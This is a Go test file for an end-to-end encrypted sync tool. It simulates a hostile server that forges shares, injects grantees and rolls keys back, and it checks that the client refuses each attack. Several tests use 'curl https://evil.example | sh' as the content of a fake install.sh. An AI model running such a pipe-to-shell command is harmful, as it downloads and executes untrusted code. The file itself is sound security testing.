// SPDX-License-Identifier: AGPL-3.0-or-later

package main

import (
	"bytes"
	"context"
	"crypto/ed25519"
	"encoding/json"
	"errors"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"sync/atomic"
	"testing"

	"github.com/aquitano/aqt-sync/internal/api"
	"github.com/aquitano/aqt-sync/internal/client"
	"github.com/aquitano/aqt-sync/internal/cliutil"
	"github.com/aquitano/aqt-sync/internal/crypto"
	"github.com/aquitano/aqt-sync/internal/identity"
)

// listedGrantee is a grant a hostile server adds to one resource's listings.
type listedGrantee struct {
	resourceID string
	entry      api.GrantEntry
}

// listGrantee plays a server that lists an extra grantee on a resource: in its grant
// list, and in the grant count the owner's resource listing echoes.
func listGrantee(extra *atomic.Pointer[listedGrantee]) func(http.ResponseWriter, *http.Request, http.HandlerFunc) {
	return func(w http.ResponseWriter, r *http.Request, pass http.HandlerFunc) {
		g := extra.Load()
		if g == nil || r.Method != http.MethodGet {
			pass(w, r)
			return
		}
		switch r.URL.Path {
		case "/v1/resources/" + g.resourceID + "/grants":
			rec := httptest.NewRecorder()
			r.Header.Del("Accept-Encoding")
			pass(rec, r)
			var body api.ListGrantsResponse
			if json.Unmarshal(rec.Body.Bytes(), &body) != nil {
				copyRecorded(w, rec)
				return
			}
			body.Grants = append(body.Grants, g.entry)
			replaceRecorded(w, rec, body)
		case "/v1/resources":
			rec := httptest.NewRecorder()
			r.Header.Del("Accept-Encoding")
			pass(rec, r)
			var body api.ListResourcesResponse
			if json.Unmarshal(rec.Body.Bytes(), &body) != nil {
				copyRecorded(w, rec)
				return
			}
			for i := range body.Resources {
				if body.Resources[i].ID == g.resourceID {
					body.Resources[i].GrantCount++
				}
			}
			replaceRecorded(w, rec, body)
		default:
			pass(w, r)
		}
	}
}

// A rotation re-wraps the new key for the grantees the server lists, and the server
// chooses that list. Here it lists bob, who holds a real share of one resource, on a
// second resource that was never shared, and replays the signature of his real grant
// with him: neither may get the new key of the resource he was never given.
func TestRotationDoesNotRewrapAGranteeTheServerAdded(t *testing.T) {
	app := &application{ctx: context.Background()}
	var extra atomic.Pointer[listedGrantee]
	h := app.newE2EWithProxy(t, listGrantee(&extra))
	grantSignup(t, h, "bob@example.com", "bob", "bob horse battery staple")
	shared := app.pushSecretFile(t, "shared.txt", "for bob")
	private := app.pushSecretFile(t, "private.txt", "never shared")
	if err := app.runShareWith(shared, "bob@example.com"); err != nil {
		t.Fatalf("share --with bob: %v", err)
	}
	cl, _, err := app.authedClient()
	if err != nil {
		t.Fatal(err)
	}
	grants, err := cl.ListGrants(shared)
	if err != nil || len(grants) != 1 {
		t.Fatalf("grants on the shared resource = %+v (%v)", grants, err)
	}
	extra.Store(&listedGrantee{resourceID: private, entry: grants[0]})

	if err := app.runPrivate(private, true); err != nil {
		t.Fatalf("rotate the never-shared resource: %v", err)
	}
	app.asProfile("bob", func() {
		bobClient, _, err := app.authedClient()
		if err != nil {
			t.Fatal(err)
		}
		if _, err := bobClient.GetResource(private); !errors.Is(err, client.ErrNotFound) {
			t.Fatalf("bob reading the never-shared resource after its rotation = %v, want ErrNotFound", err)
		}
	})

	extra.Store(nil)
	if err := app.runPrivate(shared, true); err != nil {
		t.Fatalf("rotate the shared resource: %v", err)
	}
	if got := app.pullAs(t, "bob", shared); got != "for bob" {
		t.Fatalf("bob's real share after its rotation pulled %q", got)
	}
}

// Pin repair re-sends what was granted against a placeholder pin, and the server
// chooses which resources list that placeholder. It lists it on a resource that was
// never shared: repair must neither offer nor send that one.
func TestPinRepairMovesOnlySignedGrants(t *testing.T) {
	app := &application{ctx: context.Background()}
	var extra atomic.Pointer[listedGrantee]
	h := app.newE2EWithProxy(t, listGrantee(&extra))
	const email = "dave@example.com"
	early := app.pushSecretFile(t, "early.txt", "shared too early")
	secret := app.pushSecretFile(t, "secret.txt", "never shared")
	later := app.pushSecretFile(t, "later.txt", "shared after signup")
	app.shareBeforeSignup(t, h, email, "dave", early)
	_, prof, err := app.authedClient()
	if err != nil {
		t.Fatal(err)
	}
	pins, err := identity.LoadContacts(prof.Name)
	if err != nil {
		t.Fatal(err)
	}
	extra.Store(&listedGrantee{resourceID: secret, entry: api.GrantEntry{GranteeHandle: pins[email].Handle, CreatedAt: 1}})

	var prompt string
	orig := confirmRepin
	confirmRepin = func(p string) error {
		prompt = p
		return nil
	}
	t.Cleanup(func() { confirmRepin = orig })
	if err := app.runShareWith(later, email); err != nil {
		t.Fatalf("share with the re-pin confirmed: %v", err)
	}
	if !strings.Contains(prompt, early) || strings.Contains(prompt, secret) {
		t.Fatalf("repair prompt should list the signed share and not the one the server added:\n%s", prompt)
	}
	if got := app.pullAs(t, "dave", early); got != "shared too early" {
		t.Fatalf("the repaired share pulled %q", got)
	}
	app.asProfile("dave", func() {
		daveClient, _, err := app.authedClient()
		if err != nil {
			t.Fatal(err)
		}
		if _, err := daveClient.GetResource(secret); !errors.Is(err, client.ErrNotFound) {
			t.Fatalf("dave reading the never-shared resource after repair = %v, want ErrNotFound", err)
		}
	})
}

// shareForgery is a share a hostile server rewrites to claim another owner.
type shareForgery struct {
	resourceID, owner string
	ownerKey, wrap    []byte
}

// forgeOwner rewrites one share in the grantee's listing and resource read to claim
// another owner, with a wrap the server minted under that owner's handle. It has the
// grantee's public enc key, so the wrap opens.
func forgeOwner(f *atomic.Pointer[shareForgery]) func(http.ResponseWriter, *http.Request, http.HandlerFunc) {
	return func(w http.ResponseWriter, r *http.Request, pass http.HandlerFunc) {
		forged := f.Load()
		if forged == nil || r.Method != http.MethodGet {
			pass(w, r)
			return
		}
		switch r.URL.Path {
		case "/v1/shares":
			rec := httptest.NewRecorder()
			r.Header.Del("Accept-Encoding")
			pass(rec, r)
			var body api.ListSharesResponse
			if json.Unmarshal(rec.Body.Bytes(), &body) != nil {
				copyRecorded(w, rec)
				return
			}
			for i, s := range body.Shares {
				if s.ResourceID == forged.resourceID {
					body.Shares[i].OwnerHandle, body.Shares[i].WrappedKey, body.Shares[i].OwnerPublicKey = forged.owner, forged.wrap, forged.ownerKey
				}
			}
			replaceRecorded(w, rec, body)
		case "/v1/resources/" + forged.resourceID:
			rec := httptest.NewRecorder()
			r.Header.Del("Accept-Encoding")
			pass(rec, r)
			res, err := api.DecodeResourceDownload(bytes.NewReader(rec.Body.Bytes()))
			if err != nil {
				copyRecorded(w, rec)
				return
			}
			res.Owner, res.GrantKey, res.OwnerPublicKey = forged.owner, forged.wrap, forged.ownerKey
			out, err := api.EncodeResourceDownload(res)
			if err != nil {
				copyRecorded(w, rec)
				return
			}
			for k := range rec.Header() {
				if k != "Content-Length" {
					w.Header().Set(k, rec.Header().Get(k))
				}
			}
			w.WriteHeader(rec.Code)
			_, _ = w.Write(out)
		default:
			pass(w, r)
		}
	}
}

// HPKE base mode authenticates no sender, so a server holding a file of its own can
// wrap its key to bob and list the share under a contact bob verified. Bob must
// neither name that contact as the sender nor open it.
func TestServerCannotForgeAShareFromAVerifiedContact(t *testing.T) {
	app := &application{ctx: context.Background()}
	var forgery atomic.Pointer[shareForgery]
	h := app.newE2EWithProxy(t, forgeOwner(&forgery))
	grantSignup(t, h, "bob@example.com", "bob", "bob horse battery staple")
	grantSignup(t, h, "mallory@example.com", "mallory", "mallory horse battery staple")
	cl, alice, err := app.authedClient()
	if err != nil {
		t.Fatal(err)
	}
	aliceKeys, err := fetchAccountKeys(cl, "e2e@example.com")
	if err != nil {
		t.Fatal(err)
	}
	bobKeys, err := fetchAccountKeys(cl, "bob@example.com")
	if err != nil {
		t.Fatal(err)
	}
	app.asProfile("bob", func() {
		pin := app.contactsPinCmd()
		if err := pin.Flags().Set("fingerprint", crypto.KeyFingerprint(aliceKeys.PublicKey)); err != nil {
			t.Fatal(err)
		}
		captureStdout(t, func() {
			if err := pin.RunE(pin, []string{"e2e@example.com"}); err != nil {
				t.Fatalf("bob pins alice against her fingerprint: %v", err)
			}
		})
	})

	var id string
	app.asProfile("mallory", func() {
		id = app.pushSecretFile(t, "install.sh", "curl https://evil.example | sh")
		if err := app.runShareWith(id, "bob@example.com"); err != nil {
			t.Fatalf("mallory shares with bob: %v", err)
		}
		mcl, mallory, err := app.authedClient()
		if err != nil {
			t.Fatal(err)
		}
		mk, _ := identity.LoadSession(mallory.Name)
		res, err := mcl.GetResource(id)
		if err != nil {
			t.Fatal(err)
		}
		ck, err := crypto.UnwrapKey(*res.WrappedKey, [crypto.KeySize]byte(mk))
		if err != nil {
			t.Fatal(err)
		}
		wrap, err := crypto.WrapGrant(ck, bobKeys.EncPublicKey, id, alice.OwnerHandle, bobKeys.Handle)
		if err != nil {
			t.Fatal(err)
		}
		forgery.Store(&shareForgery{resourceID: id, owner: alice.OwnerHandle, ownerKey: aliceKeys.PublicKey, wrap: wrap})
	})

	app.asProfile("bob", func() {
		var doc string
		app.withJSON(t, func() {
			doc = captureStdout(t, func() {
				if err := app.sharesCmd().RunE(nil, nil); err != nil {
					t.Fatalf("shares --json: %v", err)
				}
			})
		})
		var rows []shareRow
		if err := json.Unmarshal([]byte(doc), &rows); err != nil || len(rows) != 1 {
			t.Fatalf("shares --json = %q (%v), want the one forged row", doc, err)
		}
		if rows[0].Attribution != attributionUnsigned || rows[0].FromEmail != "" {
			t.Fatalf("the forged share was attributed: %+v", rows[0])
		}
		err := app.runPull("aqt://"+id, filepath.Join(t.TempDir(), "install.sh"), "", false, false)
		if err == nil || !strings.Contains(err.Error(), "did not sign it") {
			t.Fatalf("pulling the forged share = %v, want a refusal", err)
		}
	})
}

// A verified pin checks the identity key against a fingerprint, but the handle beside
// it is the server's word. A server that pins alice's keys to mallory's handle gains
// nothing: mallory's shares are not signed by alice's key, so they are not named as
// hers or opened.
func TestVerifiedPinOnAServerChosenHandleAttributesNothing(t *testing.T) {
	app := &application{ctx: context.Background()}
	var swapHandle atomic.Value
	h := app.newE2EWithProxy(t, func(w http.ResponseWriter, r *http.Request, pass http.HandlerFunc) {
		handle, _ := swapHandle.Load().(string)
		if handle == "" || r.URL.Path != "/v1/account/keys" || r.URL.Query().Get("email") != "e2e@example.com" {
			pass(w, r)
			return
		}
		rec := httptest.NewRecorder()
		r.Header.Del("Accept-Encoding")
		pass(rec, r)
		var keys api.AccountKeysResponse
		if json.Unmarshal(rec.Body.Bytes(), &keys) != nil {
			copyRecorded(w, rec)
			return
		}
		keys.Handle = handle
		replaceRecorded(w, rec, keys)
	})
	grantSignup(t, h, "bob@example.com", "bob", "bob horse battery staple")
	grantSignup(t, h, "mallory@example.com", "mallory", "mallory horse battery staple")
	cl, _, err := app.authedClient()
	if err != nil {
		t.Fatal(err)
	}
	aliceKeys, err := fetchAccountKeys(cl, "e2e@example.com")
	if err != nil {
		t.Fatal(err)
	}
	malloryKeys, err := fetchAccountKeys(cl, "mallory@example.com")
	if err != nil {
		t.Fatal(err)
	}
	var id string
	app.asProfile("mallory", func() {
		id = app.pushSecretFile(t, "install.sh", "curl https://evil.example | sh")
		if err := app.runShareWith(id, "bob@example.com"); err != nil {
			t.Fatalf("mallory shares with bob: %v", err)
		}
	})

	swapHandle.Store(malloryKeys.Handle)
	app.asProfile("bob", func() {
		pin := app.contactsPinCmd()
		if err := pin.Flags().Set("fingerprint", crypto.KeyFingerprint(aliceKeys.PublicKey)); err != nil {
			t.Fatal(err)
		}
		captureStdout(t, func() {
			if err := pin.RunE(pin, []string{"e2e@example.com"}); err != nil {
				t.Fatalf("bob pins alice against her fingerprint: %v", err)
			}
		})
		out := captureStdout(t, func() {
			if err := app.sharesCmd().RunE(nil, nil); err != nil {
				t.Fatalf("shares: %v", err)
			}
		})
		if strings.Contains(out, "e2e@example.com") || strings.Contains(out, "verified)") {
			t.Fatalf("mallory's share was named as alice's:\n%s", out)
		}
		err := app.runPull("aqt://"+id, filepath.Join(t.TempDir(), "install.sh"), "", false, false)
		if err == nil || !strings.Contains(err.Error(), "did not sign it") {
			t.Fatalf("pulling mallory's share under alice's pin = %v, want a refusal", err)
		}
	})
}

// A revoke used to leave a public resource's key alone, deleting bob's grant row but
// not the signature on it, which still covered the key the resource kept. It then told
// the owner to run `aqt unshare <id>`, whose rotation re-wrapped every grant signed over
// that key, so a server that kept listing the deleted row handed bob the new key. The
// rotation also lists, before it runs, who it re-wraps and which grants it leaves.
func TestRevokedGranteeIsNotRewrappedByALaterRotation(t *testing.T) {
	app := &application{ctx: context.Background()}
	var extra atomic.Pointer[listedGrantee]
	h := app.newE2EWithProxy(t, listGrantee(&extra))
	grantSignup(t, h, "bob@example.com", "bob", "bob horse battery staple")
	grantSignup(t, h, "carol@example.com", "carol", "carol horse battery staple")
	const content = "public, and granted to two accounts"
	id := app.pushSecretFile(t, "public.txt", content)
	captureStdout(t, func() {
		if err := app.runShare(id, "", true, linkPolicy{}); err != nil {
			t.Fatalf("make it public: %v", err)
		}
	})
	for _, email := range []string{"bob@example.com", "carol@example.com"} {
		if err := app.runShareWith(id, email); err != nil {
			t.Fatalf("share --with %s: %v", email, err)
		}
	}
	cl, _, err := app.authedClient()
	if err != nil {
		t.Fatal(err)
	}
	bobKeys, err := fetchAccountKeys(cl, "bob@example.com")
	if err != nil {
		t.Fatal(err)
	}
	grants, err := cl.ListGrants(id)
	if err != nil {
		t.Fatal(err)
	}
	var bobGrant api.GrantEntry
	for _, g := range grants {
		if g.GranteeHandle == bobKeys.Handle {
			bobGrant = g
		}
	}

	if err := app.runShareRevoke(id, "bob@example.com", true); err != nil {
		t.Fatalf("revoke bob: %v", err)
	}
	extra.Store(&listedGrantee{resourceID: id, entry: bobGrant})
	listing := captureStderr(t, func() {
		if err := app.runPrivate(id, true); err != nil {
			t.Fatalf("rotate after the revoke: %v", err)
		}
	})
	app.asProfile("bob", func() {
		bobClient, _, err := app.authedClient()
		if err != nil {
			t.Fatal(err)
		}
		if _, err := bobClient.GetResource(id); !errors.Is(err, client.ErrNotFound) {
			t.Fatalf("bob reading the resource after his revoke and a later rotation = %v, want ErrNotFound", err)
		}
	})
	if got := app.pullAs(t, "carol", id); got != content {
		t.Fatalf("carol pulled %q after both rotations", got)
	}
	rewrapped, left, _ := strings.Cut(listing, "these grants stay on the old key")
	if !strings.Contains(rewrapped, "re-wrapped for:\n  carol@example.com (SHA256:") || !strings.Contains(left, "bob@example.com (SHA256:") {
		t.Fatalf("the rotation should list carol as re-wrapped and bob as left behind:\n%s", listing)
	}
}

// A rotation follows grants signed over the key it replaces, and the server serves that
// key. Here it answers a rotation after bob's revoke with the resource as it was before
// it, under the current version, and lists bob's original grant again: his signature
// covers that old key. The device that revoked him must not re-wrap the new key for
// him, until it shares with him again.
func TestRevokedGranteeIsNotRewrappedWhenTheServerRollsTheKeyBack(t *testing.T) {
	app := &application{ctx: context.Background()}
	var extra atomic.Pointer[listedGrantee]
	var rollback atomic.Pointer[grantRead]
	h := app.newE2EWithProxy(t, func(w http.ResponseWriter, r *http.Request, pass http.HandlerFunc) {
		rewriteGrantRead(&rollback)(w, r, func(w http.ResponseWriter, r *http.Request) {
			listGrantee(&extra)(w, r, pass)
		})
	})
	grantSignup(t, h, "bob@example.com", "bob", "bob horse battery staple")
	const content = "shared, revoked, rolled back"
	id := app.pushSecretFile(t, "notes.txt", content)
	if err := app.runShareWith(id, "bob@example.com"); err != nil {
		t.Fatalf("share --with bob: %v", err)
	}
	cl, _, err := app.authedClient()
	if err != nil {
		t.Fatal(err)
	}
	beforeRevoke, err := cl.GetResource(id)
	if err != nil {
		t.Fatal(err)
	}
	grants, err := cl.ListGrants(id)
	if err != nil || len(grants) != 1 {
		t.Fatalf("grants before the revoke = %+v (%v)", grants, err)
	}
	if err := app.runShareRevoke(id, "bob@example.com", true); err != nil {
		t.Fatalf("revoke bob: %v", err)
	}

	rollback.Store(&grantRead{resourceID: id, rewrite: func(res *api.GetResourceResponse) {
		version := res.Version
		*res = beforeRevoke
		res.Version = version
	}})
	extra.Store(&listedGrantee{resourceID: id, entry: grants[0]})
	listing := captureStderr(t, func() {
		if err := app.runPrivate(id, true); err != nil {
			t.Fatalf("rotate from the rolled-back key: %v", err)
		}
	})
	rollback.Store(nil)
	extra.Store(nil)
	app.asProfile("bob", func() {
		bobClient, _, err := app.authedClient()
		if err != nil {
			t.Fatal(err)
		}
		if _, err := bobClient.GetResource(id); !errors.Is(err, client.ErrNotFound) {
			t.Fatalf("bob reading the resource after a rotation from the rolled-back key = %v, want ErrNotFound", err)
		}
	})
	if _, left, _ := strings.Cut(listing, "stay on the old key"); !strings.Contains(left, "bob@example.com") || !strings.Contains(left, "revoked from this device") {
		t.Fatalf("the rotation should list bob as revoked from this device:\n%s", listing)
	}

	if err := app.runShareWith(id, "bob@example.com"); err != nil {
		t.Fatalf("share with bob again: %v", err)
	}
	if err := app.runPrivate(id, true); err != nil {
		t.Fatalf("rotate after sharing with bob again: %v", err)
	}
	if got := app.pullAs(t, "bob", id); got != content {
		t.Fatalf("bob pulled %q after being shared with again and a rotation", got)
	}
}

// Only a public resource can lack an owner key. A server that drops it from the read a
// revoke makes of a private one used to have the revoke delete the grant row without
// rotating, which left bob's signature valid for the key the resource kept, so the
// next rotation followed his grant again once the server listed it.
func TestRevokeRefusesAPrivateResourceReportedWithoutAnOwnerKey(t *testing.T) {
	app := &application{ctx: context.Background()}
	var dropKey atomic.Pointer[grantRead]
	h := app.newE2EWithProxy(t, rewriteGrantRead(&dropKey))
	grantSignup(t, h, "bob@example.com", "bob", "bob horse battery staple")
	id := app.pushSecretFile(t, "notes.txt", "private, granted to bob")
	if err := app.runShareWith(id, "bob@example.com"); err != nil {
		t.Fatalf("share --with bob: %v", err)
	}

	dropKey.Store(&grantRead{resourceID: id, rewrite: func(res *api.GetResourceResponse) { res.WrappedKey = nil }})
	err := app.runShareRevoke(id, "bob@example.com", true)
	dropKey.Store(nil)
	if err == nil || !strings.Contains(err.Error(), "was not revoked") {
		t.Fatalf("revoke with the owner key dropped from the read = %v, want a refusal", err)
	}
	cl, _, err := app.authedClient()
	if err != nil {
		t.Fatal(err)
	}
	if grants, err := cl.ListGrants(id); err != nil || len(grants) != 1 {
		t.Fatalf("grants after the refused revoke = %+v (%v), want bob's left in place", grants, err)
	}
	if err := app.runShareRevoke(id, "bob@example.com", true); err != nil {
		t.Fatalf("revoke again with the owner key served: %v", err)
	}
	app.asProfile("bob", func() {
		bobClient, _, err := app.authedClient()
		if err != nil {
			t.Fatal(err)
		}
		if _, err := bobClient.GetResource(id); !errors.Is(err, client.ErrNotFound) {
			t.Fatalf("bob reading the resource after the revoke = %v, want ErrNotFound", err)
		}
	})
}

// A folder whose tree predates a root-key rotation cannot rotate its key until it is
// re-synced. Revoking a grant on it used to delete the row anyway and leave the grant
// valid for the key a later rotation replaces; now it refuses and changes nothing, so
// the same revoke runs again once the folder is re-sealed.
func TestRevokeOnAFolderThatCannotRotateChangesNothing(t *testing.T) {
	app := &application{ctx: context.Background()}
	h := app.newE2E(t)
	id, _ := pushSharedFolder(t, h)
	grantSignup(t, h, "bob@example.com", "bob", "bob horse battery staple")
	if err := app.runShareWith(id, "bob@example.com"); err != nil {
		t.Fatalf("share --with bob: %v", err)
	}
	withStdin(t, "correct horse battery staple\n")
	if err := app.runRootKeyRotation(true); err != nil {
		t.Fatalf("rotate the owner's root key: %v", err)
	}
	if err := app.runShareRevoke(id, "bob@example.com", true); err == nil || !strings.Contains(err.Error(), "aqt sync") {
		t.Fatalf("revoke on a folder that cannot rotate = %v, want a refusal pointing at `aqt sync`", err)
	}
	cl, _, err := app.authedClient()
	if err != nil {
		t.Fatal(err)
	}
	if grants, err := cl.ListGrants(id); err != nil || len(grants) != 1 {
		t.Fatalf("grants after the refused revoke = %+v (%v), want bob's left in place", grants, err)
	}
}

// A grant whose re-wrap failed keeps a signature over the replaced key, so no later
// rotation follows it. Each rotation names it with the reason, and sharing again is
// what puts the grantee back on the current key.
func TestRotationReportsGrantsItCouldNotRewrap(t *testing.T) {
	app := &application{ctx: context.Background()}
	var failGrants atomic.Bool
	h := app.newE2EWithProxy(t, func(w http.ResponseWriter, r *http.Request, pass http.HandlerFunc) {
		if failGrants.Load() && r.Method == http.MethodPost && strings.HasSuffix(r.URL.Path, "/grants") {
			w.WriteHeader(http.StatusInternalServerError)
			return
		}
		pass(w, r)
	})
	grantSignup(t, h, "carol@example.com", "carol", "carol horse battery staple")
	const content = "rotated twice"
	id := app.pushSecretFile(t, "rewrap.txt", content)
	if err := app.runShareWith(id, "carol@example.com"); err != nil {
		t.Fatalf("share --with carol: %v", err)
	}

	failGrants.Store(true)
	first := captureStderr(t, func() {
		if err := app.runPrivate(id, true); err != nil {
			t.Fatalf("rotate with the re-wrap failing: %v", err)
		}
	})
	failGrants.Store(false)
	second := captureStderr(t, func() {
		if err := app.runPrivate(id, true); err != nil {
			t.Fatalf("rotate again: %v", err)
		}
	})
	for _, want := range []struct{ out, reason string }{{first, "re-wrapping failed"}, {second, "no grant you signed over the current key"}} {
		_, report, _ := strings.Cut(want.out, "were not re-wrapped")
		if !strings.Contains(report, "carol@example.com") || !strings.Contains(report, want.reason) || !strings.Contains(report, "aqt share "+id+" --with <email>") {
			t.Fatalf("the rotation should report carol (%s) and how to share again:\n%s", want.reason, want.out)
		}
	}
	if err := app.runShareWith(id, "carol@example.com"); err != nil {
		t.Fatalf("share with carol again: %v", err)
	}
	if got := app.pullAs(t, "carol", id); got != content {
		t.Fatalf("carol pulled %q after the re-share", got)
	}
}

// A bare `aqt unshare` whose response is lost may still have rotated the key, and a
// committed rotation that never got to re-wrap leaves carol on the old key. The error
// must say so and how to get her back, rather than pass on the transport error.
func TestUnshareWithALostResponseSaysHowToRecover(t *testing.T) {
	app := &application{ctx: context.Background()}
	var loseResponse atomic.Bool
	h := app.newE2EWithProxy(t, func(w http.ResponseWriter, r *http.Request, pass http.HandlerFunc) {
		if loseResponse.Load() && r.Method == http.MethodPut && r.URL.Path == "/v1/resources" {
			pass(httptest.NewRecorder(), r)
			w.WriteHeader(http.StatusBadGateway)
			return
		}
		pass(w, r)
	})
	grantSignup(t, h, "carol@example.com", "carol", "carol horse battery staple")
	const content = "rotated without an answer"
	id := app.pushSecretFile(t, "lost.txt", content)
	if err := app.runShareWith(id, "carol@example.com"); err != nil {
		t.Fatalf("share --with carol: %v", err)
	}

	loseResponse.Store(true)
	err := app.runPrivate(id, true)
	loseResponse.Store(false)
	if err == nil {
		t.Fatal("unshare reported success with its response lost")
	}
	for _, want := range []string{"may have applied it anyway", "`aqt unshare " + id + "` again", "`aqt share ls " + id + "`", "`aqt share " + id + " --with <email>`"} {
		if !strings.Contains(err.Error(), want) {
			t.Fatalf("unshare error = %v, want it to mention %s", err, want)
		}
	}
	listing := captureStdout(t, func() {
		if err := app.runShareList(id); err != nil {
			t.Fatalf("share ls: %v", err)
		}
	})
	if !strings.Contains(listing, "carol@example.com (unsigned)") {
		t.Fatalf("share ls after the committed rotation should mark carol (unsigned):\n%s", listing)
	}
	if err := app.runShareWith(id, "carol@example.com"); err != nil {
		t.Fatalf("share with carol again: %v", err)
	}
	if got := app.pullAs(t, "carol", id); got != content {
		t.Fatalf("carol pulled %q after being shared with again", got)
	}
}

// grantRead is a grantee's read of one resource that a hostile server rewrites.
type grantRead struct {
	resourceID string
	rewrite    func(*api.GetResourceResponse)
}

// rewriteGrantRead plays a server that rewrites what a grantee reads of one resource.
func rewriteGrantRead(target *atomic.Pointer[grantRead]) func(http.ResponseWriter, *http.Request, http.HandlerFunc) {
	return func(w http.ResponseWriter, r *http.Request, pass http.HandlerFunc) {
		g := target.Load()
		if g == nil || r.Method != http.MethodGet || r.URL.Path != "/v1/resources/"+g.resourceID {
			pass(w, r)
			return
		}
		rec := httptest.NewRecorder()
		r.Header.Del("Accept-Encoding")
		pass(rec, r)
		res, err := api.DecodeResourceDownload(bytes.NewReader(rec.Body.Bytes()))
		if err != nil {
			copyRecorded(w, rec)
			return
		}
		g.rewrite(&res)
		out, err := api.EncodeResourceDownload(res)
		if err != nil {
			copyRecorded(w, rec)
			return
		}
		for k := range rec.Header() {
			if k != "Content-Length" {
				w.Header().Set(k, rec.Header().Get(k))
			}
		}
		w.WriteHeader(rec.Code)
		_, _ = w.Write(out)
	}
}

// pinVerified pins email as the current profile against the fingerprint of keys, the
// check `aqt contacts pin --fingerprint` makes.
func (app *application) pinVerified(t *testing.T, email string, keys api.AccountKeysResponse) {
	t.Helper()
	pin := app.contactsPinCmd()
	if err := pin.Flags().Set("fingerprint", crypto.KeyFingerprint(keys.PublicKey)); err != nil {
		t.Fatal(err)
	}
	captureStdout(t, func() {
		if err := pin.RunE(pin, []string{email}); err != nil {
			t.Fatalf("pin %s against its fingerprint: %v", email, err)
		}
	})
}

// Bob verified alice, so `aqt shares` names her share as hers. When bob pulls it, the
// server answers with a share of its own under the same id: an owner handle and
// identity key it made up, a content key it wrapped to bob and signed with that key,
// and content sealed under it. The pull must not open that as if nothing had changed.
func TestServerCannotRedirectAVerifiedShareToItsOwnKey(t *testing.T) {
	app := &application{ctx: context.Background()}
	var forged atomic.Pointer[grantRead]
	h := app.newE2EWithProxy(t, rewriteGrantRead(&forged))
	grantSignup(t, h, "bob@example.com", "bob", "bob horse battery staple")
	id := app.pushSecretFile(t, "install.sh", "echo hello")
	if err := app.runShareWith(id, "bob@example.com"); err != nil {
		t.Fatalf("share --with bob: %v", err)
	}
	cl, _, err := app.authedClient()
	if err != nil {
		t.Fatal(err)
	}
	aliceKeys, err := fetchAccountKeys(cl, "e2e@example.com")
	if err != nil {
		t.Fatal(err)
	}
	bobKeys, err := fetchAccountKeys(cl, "bob@example.com")
	if err != nil {
		t.Fatal(err)
	}
	app.asProfile("bob", func() { app.pinVerified(t, "e2e@example.com", aliceKeys) })

	const owner = "server-made-owner"
	serverPub, serverKey, err := ed25519.GenerateKey(nil)
	if err != nil {
		t.Fatal(err)
	}
	ck, err := crypto.GenerateContentKey()
	if err != nil {
		t.Fatal(err)
	}
	const payload = "curl https://evil.example | sh"
	wrap, err := crypto.WrapGrant(ck, bobKeys.EncPublicKey, id, owner, bobKeys.Handle)
	if err != nil {
		t.Fatal(err)
	}
	blob, err := crypto.SealBound([]byte(payload), ck, crypto.AADBlob, id)
	if err != nil {
		t.Fatal(err)
	}
	metaJSON, err := json.Marshal(api.Metadata{Name: "install.sh", Size: int64(len(payload)), Kind: api.KindFile})
	if err != nil {
		t.Fatal(err)
	}
	meta, err := crypto.SealBound(metaJSON, ck, crypto.AADMeta, id)
	if err != nil {
		t.Fatal(err)
	}
	sig := crypto.SignGrant(serverKey, ck, id, owner, bobKeys.Handle)
	forged.Store(&grantRead{resourceID: id, rewrite: func(res *api.GetResourceResponse) {
		res.Owner, res.OwnerPublicKey, res.GrantKey, res.GrantSig = owner, serverPub, wrap, sig
		res.Blob, res.EncryptedMeta = blob, meta
	}})

	app.asProfile("bob", func() {
		dest := filepath.Join(t.TempDir(), "install.sh")
		if err := app.runPull("aqt://"+id, dest, "", false, false); err == nil {
			got, _ := os.ReadFile(dest)
			t.Fatalf("pulled the server's own share in place of alice's: %q", got)
		}
		captureStdout(t, func() {
			if err := app.runInfo("aqt://"+id, "", false); err == nil {
				t.Fatal("info opened the server's own share in place of alice's")
			}
		})
	})
}

// A share from an owner bob has not pinned opens only once he pins them. Without a
// terminal the pull refuses and says how to pin; on one it shows the claim with its
// handle and fingerprint, and accepting pins it. The pull then names the sender the
// way `aqt shares` does.
func TestPullAsksBeforeOpeningAShareFromAnUnpinnedOwner(t *testing.T) {
	app := &application{ctx: context.Background()}
	h := app.newE2E(t)
	grantSignup(t, h, "bob@example.com", "bob", "bob horse battery staple")
	grantSignup(t, h, "mallory@example.com", "mallory", "mallory horse battery staple")
	var id string
	app.asProfile("mallory", func() {
		id = app.pushSecretFile(t, "notes.txt", "from mallory")
		if err := app.runShareWith(id, "bob@example.com"); err != nil {
			t.Fatalf("mallory shares with bob: %v", err)
		}
	})
	cl, _, err := app.authedClient()
	if err != nil {
		t.Fatal(err)
	}
	malloryKeys, err := fetchAccountKeys(cl, "mallory@example.com")
	if err != nil {
		t.Fatal(err)
	}
	fp := crypto.KeyFingerprint(malloryKeys.PublicKey)

	app.asProfile("bob", func() {
		pull := func() (stderr string, err error) {
			dest := filepath.Join(t.TempDir(), "notes.txt")
			stderr = captureStderr(t, func() { err = app.runPull("aqt://"+id, dest, "", false, false) })
			return stderr, err
		}
		if _, err := pull(); err == nil || !strings.Contains(err.Error(), "aqt contacts pin mallory@example.com --fingerprint") {
			t.Fatalf("pull from an unpinned owner without a terminal = %v, want a refusal that says how to pin", err)
		}

		var prompt string
		answer := cliutil.ErrAborted
		orig := confirmOwnerPin
		confirmOwnerPin = func(p string, _ bool) error {
			prompt = p
			return answer
		}
		t.Cleanup(func() { confirmOwnerPin = orig })
		if _, err := pull(); err == nil {
			t.Fatal("a declined pull opened the share")
		}
		for _, want := range []string{"mallory@example.com", malloryKeys.Handle, fp} {
			if !strings.Contains(prompt, want) {
				t.Fatalf("the prompt does not show %q:\n%s", want, prompt)
			}
		}
		answer = nil
		if _, err := pull(); err != nil {
			t.Fatalf("pull after accepting the owner: %v", err)
		}
		_, prof, err := app.authedClient()
		if err != nil {
			t.Fatal(err)
		}
		pins, err := identity.LoadContacts(prof.Name)
		if err != nil {
			t.Fatal(err)
		}
		if pin := pins["mallory@example.com"]; pin.Verified || pin.Handle != malloryKeys.Handle || !bytes.Equal(pin.PublicKey, malloryKeys.PublicKey) {
			t.Fatalf("accepting pinned %+v, want mallory's keys, unverified", pin)
		}

		confirmOwnerPin = func(string, bool) error {
			t.Error("asked again about an owner already pinned")
			return nil
		}
		stderr, err := pull()
		if err != nil {
			t.Fatalf("pull from a pinned owner: %v", err)
		}
		shares := captureStdout(t, func() {
